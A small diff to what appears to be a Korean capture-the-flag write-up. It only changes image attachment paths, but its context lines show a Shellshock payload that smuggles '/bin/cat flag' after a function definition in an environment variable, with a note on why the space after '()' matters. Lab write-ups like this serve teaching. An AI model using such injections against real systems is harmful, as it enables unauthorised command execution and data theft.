@@ -1,4 +1,4 @@
-![](Attachments/{5EBBFB66-000D-459A-A1B4-B662E4F4AC11}.png)
+![](Attachments/5EBBFB66-000D-459A-A1B4-B662E4F4AC11.png)
 
 ```c
 #include <stdio.h>
@@ -37,6 +37,6 @@ $ export x='() { echo hello; }; /bin/cat flag'
 
 () 후에 공백이 있는 이유는 함수 이름을 빈칸으로 주기 위해서이다. 주의!
 
-![](Attachments/{7034D575-7C95-43CF-AE4D-6AF911395D89}.png)
+![](Attachments/7034D575-7C95-43CF-AE4D-6AF911395D89.png)
 
 🚩
